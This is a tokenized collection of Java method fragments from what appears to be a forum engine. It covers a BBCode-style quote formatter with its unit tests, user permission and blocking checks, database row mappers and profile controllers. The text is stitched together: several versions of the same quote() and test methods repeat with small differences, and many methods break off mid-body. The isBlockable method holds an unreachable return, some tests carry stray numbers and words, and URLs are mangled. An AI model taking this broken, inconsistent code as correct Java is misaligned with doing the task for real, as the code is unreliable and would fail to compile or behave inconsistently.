protected String quote ( String text ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = text . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( '' ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
public void testToLorCodeTexFormatter ( ) { assertEquals ( RESULT_QUOTING1 , toLorCodeTexFormatter . format ( QUOTING1 , true ) ) ; assertEquals ( RESULT_QUOTING1_NOQUOTING , toLorCodeTexFormatter . format ( QUOTING1 , false ) ) ; assertEquals ( RESULT_QUOTING2 , toLorCodeTexFormatter . format ( QUOTING2 , true ) ) ; assertEquals ( RESULT_QUOTING3 , toLorCodeTexFormatter . format ( QUOTING3 , true ) ) ; assertEquals ( " [quote]test[br][/quote]test " , toLorCodeTexFormatter . format ( " >test ntest " , true ) ) ; 4 assertEquals("testtesttest", toLorCodeTexFormatter.format("testtesttest", true)); 1 assertEquals("test[quote]test[/quote]", toLorCodeTexFormatter.format("test>test", true)); 7 assertEquals("test &", toLorCodeTexFormatter.format("test &", true)); 8 assertEquals("test[br]test", toLorCodeFormatter.format("test\rtest", true)); 9 assertEquals("test[br]test", toLorCodeFormatter.format("testtest", true)); 10 assertEquals("[quote]test[br][/quote]test", toLorCodeFormatter.format(">testtest", true)); 11 assertEquals("[quote]test[br]test[/quote]", toLorCodeFormatter.format(">test>test", true)); 12 } 
public void testToLorCodeTexFormatter2 ( ) { int i ; String [ ] text = { " >one " , " >one n>one " , " >>one n>teo " , " due>>one n>teo n>>neo nwuf? nok " , " due n>>one n>teo n>>neo nwuf? nok " , " >one n>one " , } ; String [ ] bb_tex = { " [quote]one[/quote] " , " [quote]one[br]one[/quote] " , " [quote][quote]one[br][/quote]teo[/quote] " , " due>>one n[quote]teo[br]neo[br][/quote]wuf? nok " , " due n[quote][quote]one[br][/quote]teo[br]neo[br][/quote]wuf? nok " , " [quote]one[br]one[/quote] " , } ; String [ ] bb = { " [quote]one[/quote] " , " [quote]one[br]one[/quote] " , " [quote][quote]one[br][/quote]teo[/quote] " , " due>>one[br][quote]teo[br]neo[br][/quote]wuf?[br]ok " , " due[br][quote][quote]one[br][/quote]teo[br]neo[br][/quote]wuf?[br]ok " , " [quote]one[br]one[/quote] " , } ; String [ ] html_tex = { " <div class= \" quote \" ><p>one</p></div> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo</p></div> " , " <p>due&gt;&gt;one n</p><div class= \" quote \" ><p>teo<br>neo<br></p></div><p>wuf? nok</p> " , " <p>due n</p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br>neo<br></p></div><p>wuf? nok</p> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , } ; String [ ] html = { " <div class= \" quote \" ><p>one</p></div> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo</p></div> " , " <p>due&gt;&gt;one<br></p><div class= \" quote \" ><p>teo<br>neo<br></p></div><p>wuf?<br>ok</p> " , " <p>due<br></p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br>neo<br></p></div><p>wuf?<br>ok</p> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , } ; for ( i = 0 ; i < text . length ; i + + ) { String entry = text [ i ] ; 
private static ModelAndView redirectToProfile ( User user ) { return new ModelAndView ( new RedirectView ( getNoCacheLinkToProfile ( user ) ) ) ; } 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } if ( canModerate ( ) ) { return false ; } return true ; return (maxScore < BLOCK_MAX_SCORE) && (score < BLOCK_SCORE); 
public void user5starTest ( ) throws Exception { ResultSet resultSet = Users . getUser5star ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Commit access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . canModerate ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertTrue ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public TrackerItem mapRow ( ResultSet resultSet , int i ) throws SQLException { User author , lastCommentBy ; int msgid , cid , pages ; Timestamp lastmod , postdate ; int stat1 , stat3 , stat4 ; int groupId , section ; String groupTitle , groupUrlName ; String title ; boolean resolved , uncommited ; try { int author_id = resultSet . getInt ( " author " ) ; if ( author_id ! = 0 ) { author = userDao . getUserCached ( author_id ) ; } else { author = null ; } } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } msgid = resultSet . getInt ( " id " ) ; lastmod = resultSet . getTimestamp ( " lastmod " ) ; stat1 = resultSet . getInt ( " stat1 " ) ; stat3 = resultSet . getInt ( " stat3 " ) ; stat4 = resultSet . getInt ( " stat4 " ) ; groupId = resultSet . getInt ( " gid " ) ; groupTitle = resultSet . getString ( " gtitle " ) ; title = resultSet . getString ( " title " ) ; cid = resultSet . getInt ( " cid " ) ; try { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } resolved = resultSet . getBoolean ( " resolved " ) ; section = resultSet . getInt ( " section " ) ; groupUrlName = resultSet . getString ( " urlname " ) ; postdate = resultSet . getTimestamp ( " postdate " ) ; uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; pages = Message . getPageCount ( stat1 , messagesInPage ) ; return new TrackerItem ( author , msgid , lastmod , stat1 , stat3 , stat4 , groupId , groupTitle , title , cid , lastCommentBy , resolved , 
public String format ( String text , boolean quoting ) { String newText = text . replaceAll ( " \\ [(/?code(:?=[ \\ w \\ s]+)?) \\ ] " , " [[$1]] " ) ; if ( quoting ) { return quote ( newText ) ; 
public void testToLorCodeFormatter2 ( ) { int i ; String [ ] text = { " >one " , " >one n>one " , " >>one n>teo " , " due>>one n>teo n>>neo nwuf? nok " , " due n>>one n>teo n>>neo nwuf? nok " , " >one n>one " , } ; String [ ] bb_tex = { " [quote]one[/quote] " , " [quote]one[br]one[/quote] " , " [quote][quote]one[br][/quote]teo[/quote] " , " due>>one n[quote]teo[br]neo[br][/quote]wuf? nok " , " due n[quote][quote]one[br][/quote]teo[br]neo[br][/quote]wuf? nok " , " [quote]one[br]one[/quote] " , } ; String [ ] bb = { " [quote]one[/quote] " , " [quote]one[br]one[/quote] " , " [quote][quote]one[br][/quote]teo[/quote] " , " due>>one[br][quote]teo[br]neo[br][/quote]wuf?[br]ok " , " due[br][quote][quote]one[br][/quote]teo[br]neo[br][/quote]wuf?[br]ok " , " [quote]one[br]one[/quote] " , } ; String [ ] html_tex = { " <div class= \" quote \" ><p>one</p></div> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo</p></div> " , " <p>due&gt;&gt;one n</p><div class= \" quote \" ><p>teo<br>neo<br></p></div><p>wuf? nok</p> " , " <p>due n</p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br>neo<br></p></div><p>wuf? nok</p> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , } ; String [ ] html = { " <div class= \" quote \" ><p>one</p></div> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo</p></div> " , " <p>due&gt;&gt;one<br></p><div class= \" quote \" ><p>teo<br>neo<br></p></div><p>wuf?<br>ok</p> " , " <p>due<br></p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br>neo<br></p></div><p>wuf?<br>ok</p> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , } ; for ( i = 0 ; i < text . length ; i + + ) { String entry = text [ i ] ; 
public void codeEscape ( ) { assertEquals ( " [[code]][[/code]] " , toLorCodeTexFormatter . format ( " [code][/code] " , true ) ) ; assertEquals ( " [[code=perl]][[/code]] " , toLorCodeTexFormatter . format ( " [code=perl][/code] " , true ) ) ; assertEquals ( " [[code]][[/code]] " , toLorCodeFormatter . format ( " [code][/code] " , true ) ) ; assertEquals ( " [[code=perl]][[/code]] " , toLorCodeFormatter . format ( " [code=perl][/code] " , true ) ) ; 
protected String quote ( String text ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = text . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( " [br] " ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
protected String quote ( String text ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = text . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( '' ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
public void testToLorCodeFormatter2 ( ) { int i ; String [ ] text = { " >one " , " >one n>one " , " >>one n>teo " , " due>>one n>teo n>>neo nwuf? nok " , " due n>>one n>teo n>>neo nwuf? nok " , " >one n>one " , } ; String [ ] bb_tex = { " [quote]one[/quote] " , " [quote]one[br]one[/quote] " , " [quote][quote]one[br][/quote]teo[/quote] " , " due>>one n[quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " , " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " , " [quote]one[br]one[/quote] " , } ; String [ ] bb = { " [quote]one[/quote] " , " [quote]one[br]one[/quote] " , " [quote][quote]one[br][/quote]teo[/quote] " , " due>>one[br][quote]teo[br][quote]neo[br][/quote][/quote]wuf?[br]ok " , " due[br][quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf?[br]ok " , " [quote]one[br]one[/quote] " , } ; String [ ] html_tex = { " <div class= \" quote \" ><p>one</p></div> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo</p></div> " , " <p>due&gt;&gt;one n</p><div class= \" quote \" ><p>teo<br></p><div class= \" quote \" ><p>neo<br></p></div></div><p>wuf? nok</p> " , " <p>due n</p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br></p><div class= \" quote \" ><p>neo<br></p></div></div><p>wuf? nok</p> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , } ; String [ ] html = { " <div class= \" quote \" ><p>one</p></div> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo</p></div> " , " <p>due&gt;&gt;one<br></p><div class= \" quote \" ><p>teo<br></p><div class= \" quote \" ><p>neo<br></p></div></div><p>wuf?<br>ok</p> " , " <p>due<br></p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br></p><div class= \" quote \" ><p>neo<br></p></div></div><p>wuf?<br>ok</p> " , " <div class= \" quote \" ><p>one<br>one</p></div> " , } ; for ( i = 0 ; i < text . length ; i + + ) { String entry = text [ i ] ; 
public void againQuoteFormatter ( ) { assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , toLorCodeFormatter . format ( " >one n>>two n>one n>>>three " , true ) ) ; assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , toLorCodeTexFormatter . format ( " >one n>>two n>one n>>>three " , true ) ) ; 
protected String quote ( String text ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = text . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } else { buf . append ( " [br] " ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
protected String quote ( String text ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = text . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } else { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( '' ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
public PreparedComment prepareCommentRSS ( Comment comment , CommentList comments , boolean secure ) throws UserNotFoundException { return prepareComment ( comment , comments , secure , true ) ; } 
public PreparedComment prepareComment ( Comment comment , CommentList comments , boolean secure ) throws UserNotFoundException { return prepareComment ( comment , comments , secure , false ) ; } 
public List < PreparedComment > prepareCommentListRSS ( CommentList comments , List < Comment > list , boolean secure ) throws UserNotFoundException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( prepareCommentRSS ( comment , comments , secure ) ) ; } return commentsPrepared ; } 
public String mapRow ( ResultSet resultSet , int i ) throws SQLException { String text = resultSet . getString ( " message " ) ; boolean isLorcode = resultSet . getBoolean ( " bbcode " ) ; if ( isLorcode ) { return lorCodeService . parseCommentRSS ( text , secure ) ; 
public String parseComment ( String text , boolean secure ) { return defaultParser . parseRoot ( prepareCommentRootNode ( secure , false ) , text ) . renderXHtml ( ) ; } 
public String parseCommentRSS ( String text , boolean secure ) { return defaultParser . parseRoot ( prepareCommentRootNode ( secure , true ) , text ) . renderXHtml ( ) ; } 
private RootNode prepareCommentRootNode ( boolean secure , boolean rss ) { RootNode rootNode = defaultParser . getRootNode ( ) ; rootNode . setCommentCutOptions ( ) ; rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; rootNode . setRss ( rss ) ; return rootNode ; } 
public void quoteTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote]hello world[/quote] " , false ) , citeHeader + " <p>hello world</p> " + citeFooter ) ; 
public void quoteParamTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote=maxcom]hello world[/quote] " , false ) , citeHeader + " <p><cite>maxcom</cite></p><p>hello world</p> " + citeFooter ) ; 
public void overflow1Test ( ) { Assert . assertEquals ( " <p>ololo</p> " + citeHeader + " <p><i>hz</i></p> " + citeFooter , lorCodeService . parseComment ( " ololo[quote][i]hz[/i][/quote] " , false ) ) ; 
public void paragraphLogicTest ( ) { list Assert.assertEquals("<p>some1 text</p><p>some2 text</p><ul><li>one</li><li>two</li></ul><p><a href=\"http:www.example.com\">http:www.example.com</a> - some3 text</p>", lorCodeService.parseComment("some1 textsome2 text[list][*]one[*]two[/list][url]http:www.example.com[/url] - some3 text", false)); b Assert.assertEquals("<p><b><p>te</p><p>xt</p></b></p>", lorCodeService.parseComment("[b]text[/b]", false)); i Assert.assertEquals("<p><i><p>te</p><p>xt</p></i></p>", lorCodeService.parseComment("[i]text[/i]", false)); u Assert.assertEquals("<p><u><p>te</p><p>xt</p></u></p>", lorCodeService.parseComment("[u]text[/u]", false)); s Assert.assertEquals("<p><s><p>te</p><p>xt</p></s></p>", lorCodeService.parseComment("[s]text[/s]", false)); em Assert.assertEquals("<p><em><p>te</p><p>xt</p></em></p>", lorCodeService.parseComment("[em]text[/em]", false)); strong Assert.assertEquals("<p><strong><p>te</p><p>xt</p></strong></p>", lorCodeService.parseComment("[strong]text[/strong]", false)); p Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[p]text[/p]", false)); div Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[div]text[/div]", false)); quote Assert.assertEquals(citeHeader + "<p>te</p><p>xt</p>" + citeFooter, lorCodeService.parseComment("[quote]text[/quote]", false)); cut Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[cut]text[/cut]", false)); user Assert.assertEquals("<p><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[user]splinter[/user]", false)); 
private static SolrInputDocument processComment ( Message topic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , comment . getTopicId ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; String topicTitle = topic . getTitle ( ) ; doc . addField ( " topic_title " , StringEscapeUtils . unescapeHtml ( topicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( topicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . addField ( " title " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , true ) ; return doc ; } 
public List < TagCloudDao . TagDTO > get ( ) { return getTagDao ( ) . getTags ( i ) ; } 
public void execute ( Object o ) { TopTenDao . TopTenMessageDTO dto = ( TopTenDao . TopTenMessageDTO ) o ; int tmp = dto . getAnswers ( ) / itemsPerPage ; tmp = ( dto . getAnswers ( ) % itemsPerPage > 0 ) ? tmp + 1 : tmp ; dto . setPages ( tmp ) ; } 
public List < VoteDto > get ( ) { return pollDao . getVoteDTO ( poll . getId ( ) ) ; } 
public VoteDto mapRow ( ResultSet rs , int rowNum ) throws SQLException { VoteDto dto = new VoteDto ( ) ; dto . setId ( rs . getInt ( " id " ) ) ; dto . setLabel ( rs . getString ( " label " ) ) ; dto . setPollId ( pollId ) ; return dto ; } 
public ModelMap showRemove ( @RequestParam String tag , @RequestParam ( required = false ) Integer pos , ServletRequest request ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } ModelMap result = new ModelMap ( ) ; EditBoxesRequest form = new EditBoxesRequest ( ) ; form . setPosition ( pos ) ; form . setTag ( tag ) ; result . addAttribute ( " form " , form ) ; return result ; } 
public boolean supports ( Class clazz ) { return AddRemoveBoxesController . EditBoxesRequest . class . isAssignableFrom ( clazz ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { mv . getModel ( ) . put ( " ignoreList " , ignoreListDao . get ( tmpl . getCurrentUser ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; return mv ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( tmpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; return mv ; } 
public boolean isTopicPostingAllowed ( User currentUser ) { if ( ! isTopicsRestricted ( ) ) { return true ; } if ( currentUser = = null ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } if ( restrictTopics = = - 1 ) { return currentUser . isModerator ( ) ; 
public boolean isCommentPostingAllowed ( User currentUser ) { if ( ! isCommentsRestricted ( ) ) { return true ; } if ( restrictComments = = - 1 ) { return currentUser . isModerator ( ) ; } return currentUser . getScore ( ) > = restrictComments ; } 
public boolean isCommentsAllowed ( User user ) { if ( user ! = null & & user . isBlocked ( ) ) { return false ; } if ( deleted | | expired ) { return false ; } int score = getPostScore ( ) ; if ( score = = POSTSCORE_UNRESTRICTED ) { return true ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return true ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return true ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = userid ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return true ; 
